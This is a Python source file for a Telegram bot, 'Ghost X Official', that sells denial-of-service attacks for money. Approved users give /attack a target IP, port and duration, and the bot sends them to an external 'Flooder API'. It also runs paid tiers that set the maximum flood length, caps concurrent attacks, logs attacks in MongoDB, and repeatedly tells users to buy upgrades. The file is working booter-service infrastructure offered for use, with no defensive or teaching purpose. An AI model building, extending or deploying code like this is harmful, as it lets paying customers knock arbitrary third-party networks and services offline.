import asyncio
import logging
import requests
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional, List
import re
from functools import wraps
import uuid
import os
from dotenv import load_dotenv
from telegram import Update, ChatMember
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes
)
import pymongo
from pymongo import MongoClient, ASCENDING, DESCENDING

load_dotenv()

# ---------- CONFIG ----------
BOT_NAME = "Ghost X Official"
CONTACT = "@MODSERVEROFC"
BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGODB_URI = os.getenv("MONGODB_URI")
DATABASE_NAME = os.getenv("DATABASE_NAME", "attack_bot")
API_URL = os.getenv("API_URL")
API_KEY = os.getenv("API_KEY")
ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "1793697840").split(",")]
ACCESS_GROUP_USERNAME = "MODSERVEROFC"
MAX_CONCURRENT_ATTACKS = 4

BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}
MIN_PORT, MAX_PORT = 1, 65535

# TIER DURATION LIMITS (in seconds)
TIER_LIMITS = {
    "free": {"min": 1, "max": 60},      # Free users: up to 60 seconds
    "premium": {"min": 1, "max": 180},   # Premium: up to 180 seconds
    "vip": {"min": 1, "max": 300}        # VIP: up to 300 seconds
}
DEFAULT_TIER = "free"

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ---------- Helper Functions ----------
def make_aware(dt):
    if dt is None: return None
    if hasattr(dt, 'tzinfo') and dt.tzinfo is None:
        return dt.replace(tzinfo=timezone.utc)
    return dt

def get_current_time():
    return datetime.now(timezone.utc)

def is_port_blocked(port: int) -> bool:
    return port in BLOCKED_PORTS

def get_blocked_ports_list() -> str:
    return ", ".join(str(p) for p in sorted(BLOCKED_PORTS))

# ---------- Database ----------
class Database:
    def __init__(self):
        self.client = MongoClient(MONGODB_URI)
        self.db = self.client[DATABASE_NAME]
        self.users = self.db.users
        self.attacks = self.db.attacks
        try:
            self.users.delete_many({"user_id": None})
            self.users.delete_many({"user_id": {"$exists": False}})
            self.users.drop_indexes()
            self.attacks.drop_indexes()
        except: pass
        self.attacks.create_index([("timestamp", DESCENDING)])
        self.attacks.create_index([("user_id", ASCENDING)])
        self.users.create_index([("user_id", ASCENDING)], unique=True, sparse=True)

    def get_user(self, user_id: int) -> Optional[Dict]:
        user = self.users.find_one({"user_id": user_id})
        if user:
            for f in ["created_at", "approved_at", "expires_at"]:
                if user.get(f):
                    user[f] = make_aware(user[f])
            if "tier" not in user:
                user["tier"] = DEFAULT_TIER
                self.users.update_one({"user_id": user_id}, {"$set": {"tier": DEFAULT_TIER}})
        return user

    def create_user(self, user_id: int, username: str = None) -> Dict:
        if self.get_user(user_id): return self.get_user(user_id)
        user_data = {
            "user_id": user_id, "username": username, "approved": False,
            "approved_at": None, "expires_at": None, "total_attacks": 0,
            "created_at": get_current_time(), "is_banned": False, "tier": DEFAULT_TIER
        }
        try:
            self.users.insert_one(user_data)
            logger.info(f"Created user {user_id} with tier {DEFAULT_TIER}")
        except: pass
        return user_data

    def approve_user(self, user_id: int, days: int) -> bool:
        expires_at = get_current_time() + timedelta(days=days)
        res = self.users.update_one({"user_id": user_id}, {"$set": {"approved": True, "approved_at": get_current_time(), "expires_at": expires_at}})
        return res.modified_count > 0

    def disapprove_user(self, user_id: int) -> bool:
        res = self.users.update_one({"user_id": user_id}, {"$set": {"approved": False, "expires_at": None}})
        return res.modified_count > 0

    def set_user_tier(self, user_id: int, tier: str) -> bool:
        if tier not in TIER_LIMITS: return False
        res = self.users.update_one({"user_id": user_id}, {"$set": {"tier": tier}})
        return res.modified_count > 0

    def get_user_tier(self, user_id: int) -> str:
        u = self.get_user(user_id)
        return u.get("tier", DEFAULT_TIER) if u else DEFAULT_TIER

    def log_attack(self, user_id: int, ip: str, port: int, duration: int, status: str, response: str = None):
        self.attacks.insert_one({
            "_id": str(uuid.uuid4()), "user_id": user_id, "ip": ip, "port": port,
            "duration": duration, "status": status, "response": response[:500] if response else None,
            "timestamp": get_current_time()
        })
        self.users.update_one({"user_id": user_id}, {"$inc": {"total_attacks": 1}})

    def get_all_users(self) -> List[Dict]:
        users = list(self.users.find({"user_id": {"$ne": None, "$exists": True}}))
        for u in users:
            if u.get("created_at"): u["created_at"] = make_aware(u["created_at"])
            if u.get("approved_at"): u["approved_at"] = make_aware(u["approved_at"])
            if u.get("expires_at"): u["expires_at"] = make_aware(u["expires_at"])
            if "tier" not in u: u["tier"] = DEFAULT_TIER
        return users

    def get_user_attack_stats(self, user_id: int) -> Dict:
        total = self.attacks.count_documents({"user_id": user_id})
        success = self.attacks.count_documents({"user_id": user_id, "status": "success"})
        failed = self.attacks.count_documents({"user_id": user_id, "status": "failed"})
        recent = list(self.attacks.find({"user_id": user_id}).sort("timestamp", -1).limit(10))
        for a in recent:
            if a.get("timestamp"): a["timestamp"] = make_aware(a["timestamp"])
        return {"total": total, "successful": success, "failed": failed, "recent": recent}

db = Database()

# ---------- Access Control ----------
async def is_member_of_access_group(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    try:
        chat = await context.bot.get_chat(f"@{ACCESS_GROUP_USERNAME}")
        member = await context.bot.get_chat_member(chat.id, user_id)
        return member.status in [ChatMember.MEMBER, ChatMember.ADMINISTRATOR, ChatMember.OWNER]
    except Exception as e:
        logger.error(f"Access check failed: {e}")
        return False

async def require_access(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    user_id = update.effective_user.id
    if user_id in ADMIN_IDS:
        return True
    if not await is_member_of_access_group(user_id, context):
        await update.message.reply_text(f"❌ Access denied. You must join @{ACCESS_GROUP_USERNAME} to use {BOT_NAME}.\n\n💸 Want to buy? DM {CONTACT}")
        return False
    return True

async def is_user_approved(user_id: int) -> bool:
    u = db.get_user(user_id)
    if not u or not u.get("approved"): return False
    exp = u.get("expires_at")
    if exp and make_aware(exp) < get_current_time(): return False
    return True

# ---------- API Functions ----------
def launch_attack(ip: str, port: int, duration: int) -> Dict:
    try:
        resp = requests.post(
            f"{API_URL}/api/v1/attack",
            json={"ip": ip, "port": port, "duration": duration},
            headers={"x-api-key": API_KEY, "Content-Type": "application/json"},
            timeout=15
        )
        return resp.json()
    except Exception as e:
        return {"success": False, "error": str(e)}

def get_active_attacks() -> Dict:
    try:
        resp = requests.get(
            f"{API_URL}/api/v1/active",
            headers={"x-api-key": API_KEY},
            timeout=10
        )
        return resp.json()
    except:
        return {"success": False, "error": "API unreachable"}

# ---------- Admin Decorator ----------
def admin_required(func):
    @wraps(func)
    async def wrapper(update, context, *args, **kwargs):
        if update.effective_user.id not in ADMIN_IDS:
            await update.message.reply_text("❌ Admin only.")
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

# ---------- Admin Commands ----------
@admin_required
async def approve_command(update, context):
    try:
        uid = int(context.args[0])
        days = int(context.args[1])
        if days <= 0: raise ValueError
        if not db.get_user(uid):
            db.create_user(uid, username=None)
        if db.approve_user(uid, days):
            exp = get_current_time() + timedelta(days=days)
            await update.message.reply_text(f"✅ User {uid} approved for {days} days, expires {exp.strftime('%Y-%m-%d')}")
            try:
                await context.bot.send_message(uid, f"✅ You have been approved for {days} days! Use /help")
            except:
                await update.message.reply_text("⚠️ User approved but could not notify.")
        else:
            await update.message.reply_text("❌ Approval failed.")
    except:
        await update.message.reply_text("Usage: /approve <user_id> <days>")

@admin_required
async def disapprove_command(update, context):
    try:
        uid = int(context.args[0])
        if db.disapprove_user(uid):
            await update.message.reply_text(f"✅ User {uid} disapproved")
            try:
                await context.bot.send_message(uid, "❌ Your access has been revoked.")
            except:
                pass
        else:
            await update.message.reply_text("❌ User not found.")
    except:
        await update.message.reply_text("Usage: /disapprove <user_id>")

@admin_required
async def set_tier_command(update, context):
    """Set user tier: /set_tier <user_id> <free|premium|vip>"""
    try:
        uid = int(context.args[0])
        tier = context.args[1].lower()
        if tier not in TIER_LIMITS:
            raise ValueError
        if db.set_user_tier(uid, tier):
            limits = TIER_LIMITS[tier]
            await update.message.reply_text(f"✅ User {uid} tier set to {tier.upper()} (max {limits['max']} seconds)")
            try:
                await context.bot.send_message(uid, f"🔄 Your tier has been updated to {tier.upper()}! Max duration: {limits['max']}s")
            except:
                pass
        else:
            await update.message.reply_text("❌ Failed to set tier.")
    except:
        await update.message.reply_text("Usage: /set_tier <user_id> <free|premium|vip>")

@admin_required
async def users_command(update, context):
    users = db.get_all_users()
    if not users:
        await update.message.reply_text("📭 No users found.")
        return
    msg = f"👥 Total users: {len(users)}\n\n"
    for u in users[:20]:
        tier = u.get("tier", "free").upper()
        status = "✅" if u.get("approved") else "❌"
        attacks = u.get("total_attacks", 0)
        msg += f"ID: {u['user_id']} | {tier} | {status} | attacks: {attacks}\n"
    if len(users) > 20:
        msg += f"\n*And {len(users)-20} more...*"
    await update.message.reply_text(msg)

@admin_required
async def status_command(update, context):
    try:
        r = requests.get(f"{API_URL}/api/v1/health", headers={"x-api-key": API_KEY}, timeout=5)
        if r.status_code == 200:
            await update.message.reply_text("✅ Flooder API: Healthy")
        else:
            await update.message.reply_text(f"❌ Flooder API: HTTP {r.status_code}")
    except:
        await update.message.reply_text("❌ Flooder API: Unreachable")

@admin_required
async def running_command(update, context):
    active = get_active_attacks()
    if active.get("success"):
        count = active.get("count", 0)
        await update.message.reply_text(f"🎯 Active attacks: {count}/{MAX_CONCURRENT_ATTACKS}")
    else:
        await update.message.reply_text(f"❌ Could not fetch: {active.get('error', 'Unknown')}")

@admin_required
async def stats_command(update, context):
    total_attacks = db.attacks.count_documents({})
    users = len(db.get_all_users())
    await update.message.reply_text(f"📊 {BOT_NAME} Stats\nUsers: {users}\nTotal attacks logged: {total_attacks}")

@admin_required
async def blockedports_admin(update, context):
    await blockedports_command(update, context)

# ---------- User Commands ----------
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username
    if not await require_access(update, context):
        return
    user = db.create_user(user_id, username)
    if await is_user_approved(user_id):
        tier = user.get("tier", "free")
        limits = TIER_LIMITS[tier]
        expires = user.get("expires_at")
        days_left = max(0, (make_aware(expires) - get_current_time()).days) if expires else 0
        msg = (f"🔥 Welcome to {BOT_NAME} 🔥\n\n"
               f"👤 User: {username}\n"
               f"⭐ Tier: {tier.upper()} (max {limits['max']} seconds)\n"
               f"📅 Expires: {days_left} days\n\n"
               f"Commands:\n/attack IP PORT DURATION\n/myinfo\n/mystats\n/myattacks\n/blockedports\n/help\n\n"
               f"💸 Want to upgrade? DM {CONTACT}")
    else:
        msg = (f"❌ Access Denied, {username}!\n\nYour account is not approved or expired.\n💸 Purchase: DM {CONTACT}")
    await update.message.reply_text(msg)

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not await require_access(update, context):
        return
    if not await is_user_approved(user_id):
        await update.message.reply_text(f"❌ Account not approved. Contact {CONTACT} to purchase.")
        return

    # Check concurrent attacks
    active = get_active_attacks()
    if active.get("success") and active.get("count", 0) >= MAX_CONCURRENT_ATTACKS:
        await update.message.reply_text(f"❌ Max concurrent attacks ({MAX_CONCURRENT_ATTACKS}) reached. Wait.")
        return

    args = context.args
    if len(args) != 3:
        await update.message.reply_text("Usage: /attack <IP> <PORT> <DURATION>\nExample: /attack 1.2.3.4 80 30")
        return

    ip, port_str, dur_str = args
    # Validate IP
    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    if not ip_pattern.match(ip):
        await update.message.reply_text("❌ Invalid IP address.")
        return
    # Validate port
    try:
        port = int(port_str)
        if port < MIN_PORT or port > MAX_PORT or is_port_blocked(port):
            raise ValueError
    except:
        await update.message.reply_text(f"Invalid/blocked port. Allowed: {MIN_PORT}-{MAX_PORT} except {get_blocked_ports_list()}")
        return
    # Validate duration based on user's tier
    try:
        duration = int(dur_str)
        tier = db.get_user_tier(user_id)
        limits = TIER_LIMITS[tier]
        if duration < limits["min"] or duration > limits["max"]:
            await update.message.reply_text(
                f"❌ Duration {duration}s exceeds your tier ({tier.upper()}).\n"
                f"Max allowed: {limits['max']}s.\n"
                f"💸 Upgrade to increase limit: DM {CONTACT}"
            )
            return
    except:
        await update.message.reply_text("❌ Invalid duration.")
        return

    msg = await update.message.reply_text(f"🎯 Launching attack {ip}:{port} for {duration}s...")
    resp = launch_attack(ip, port, duration)
    if resp.get("success"):
        db.log_attack(user_id, ip, port, duration, "success", str(resp))
        active_info = get_active_attacks()
        usage = f"📊 Server Load: {active_info.get('count',0)}/{MAX_CONCURRENT_ATTACKS} attacks running"
        await msg.edit_text(f"✅ Attack launched!\n{ip}:{port} for {duration}s\n{usage}\n\n💸 Buy more power: {CONTACT}")

        async def attack_complete():
            await asyncio.sleep(duration)
            await update.message.reply_text(f"✅ Attack complete! {ip}:{port} finished {duration}s flood.\n💸 DM {CONTACT} for more power.")
        asyncio.create_task(attack_complete())
    else:
        db.log_attack(user_id, ip, port, duration, "failed", str(resp))
        await msg.edit_text(f"❌ Attack failed: {resp.get('error', 'Unknown')}\n\nContact {CONTACT} for support.")

async def myattacks_command(update, context):
    if not await require_access(update, context): return
    active = get_active_attacks()
    if active.get("success"):
        attacks = active.get("activeAttacks", [])
        if attacks:
            text = f"🎯 Active attacks ({len(attacks)}/{MAX_CONCURRENT_ATTACKS}):\n"
            for a in attacks:
                text += f"🔹 {a['target']} expires in {a['expiresIn']}s\n"
        else:
            text = "✅ No active attacks."
        await update.message.reply_text(text)
    else:
        await update.message.reply_text("❌ Could not fetch active attacks.")

async def myinfo_command(update, context):
    if not await require_access(update, context): return
    user = db.get_user(update.effective_user.id)
    if not user:
        await update.message.reply_text("User not found. Send /start first.")
        return
    tier = user.get("tier", "free")
    limits = TIER_LIMITS[tier]
    status = "✅ Approved" if user.get("approved") else "❌ Not approved"
    expires = user.get("expires_at")
    expires_str = make_aware(expires).strftime("%Y-%m-%d") if expires else "N/A"
    msg = (f"📋 {BOT_NAME} - Your Info\n"
           f"🆔 ID: {user['user_id']}\n"
           f"👤 @{user.get('username', 'N/A')}\n"
           f"⭐ Tier: {tier.upper()} (max {limits['max']}s)\n"
           f"{status}\n📅 Expires: {expires_str}\n"
           f"🎯 Total attacks: {user.get('total_attacks',0)}\n\n"
           f"💸 Upgrade: DM {CONTACT}")
    await update.message.reply_text(msg)

async def mystats_command(update, context):
    if not await require_access(update, context): return
    stats = db.get_user_attack_stats(update.effective_user.id)
    rate = stats['successful']/stats['total']*100 if stats['total']>0 else 0
    msg = (f"📊 Your attack stats\n"
           f"Total: {stats['total']}\n"
           f"✅ Success: {stats['successful']}\n"
           f"❌ Failed: {stats['failed']}\n"
           f"📈 Success rate: {rate:.1f}%")
    await update.message.reply_text(msg)

async def blockedports_command(update, context):
    await update.message.reply_text(f"🚫 Blocked ports: {get_blocked_ports_list()}\nAllowed: {MIN_PORT}-{MAX_PORT} except those.\n\n💸 DM {CONTACT} for custom unlocks.")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await require_access(update, context):
        return
    msg = (
        f"🔥 {BOT_NAME} Help 🔥\n\n"
        "📱 **User Commands:**\n"
        "/attack IP PORT DURATION – Launch an attack\n"
        "/myattacks – Show your active attacks\n"
        "/myinfo – Your account details\n"
        "/mystats – Attack history\n"
        "/blockedports – List blocked ports\n"
        "/start – Welcome message\n"
        "/help – This menu\n\n"
        f"⭐ **Tiers & Maximum Duration:**\n"
        f"• Free: 60 seconds\n"
        f"• Premium: 180 seconds\n"
        f"• VIP: 300 seconds\n\n"
        f"📡 Max concurrent attacks: {MAX_CONCURRENT_ATTACKS}\n\n"
        f"💸 Want to buy or upgrade? DM {CONTACT}"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

# ---------- Error Handler ----------
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Update {update} caused error {context.error}")
    if update and update.effective_message:
        await update.effective_message.reply_text("❌ An error occurred. Please try again later.")

# ---------- Main ----------
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    # Admin commands
    app.add_handler(CommandHandler("approve", approve_command))
    app.add_handler(CommandHandler("disapprove", disapprove_command))
    app.add_handler(CommandHandler("set_tier", set_tier_command))
    app.add_handler(CommandHandler("users", users_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("running", running_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("blockedports", blockedports_admin))
    # User commands
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("myattacks", myattacks_command))
    app.add_handler(CommandHandler("myinfo", myinfo_command))
    app.add_handler(CommandHandler("mystats", mystats_command))
    app.add_handler(CommandHandler("blockedports", blockedports_command))

    app.add_error_handler(error_handler)

    print(f"{BOT_NAME} is starting... (Tiers: Free 60s, Premium 180s, VIP 300s)")
    app.run_polling()

if __name__ == "__main__":
    main()
